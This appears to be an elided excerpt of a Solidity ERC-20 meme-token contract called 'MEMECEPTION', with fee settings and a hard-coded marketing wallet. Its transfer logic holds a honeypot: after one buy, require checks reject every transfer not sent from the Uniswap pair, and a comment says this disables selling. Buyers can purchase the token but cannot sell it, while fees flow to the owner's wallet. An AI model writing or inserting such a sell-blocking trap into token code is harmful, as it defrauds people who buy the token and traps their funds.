...
contract MEMECEPTION is Context, IERC20, Ownable {
    ...
    string private constant _name = "PEPESHIBAMUSKDONALDTRUMPDOGE inu"; // 
    string private constant _symbol = "MEMECEPTION"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 5;
    address public  _marketingWallet = 0xAf3aAdA337B72BC1f4F7334d406FAb4DBE733BC1;
    ...
    require(sender == uniswapV2Pair || _buyCounter < 1, "");
    ...
    // If the buy counter has reached 1, disable selling (transfers from non-Uniswap pair addresses)
    require(sender == uniswapV2Pair || _buyCounter < 1, "TransferFrom: Selling is disabled after 1 buy");
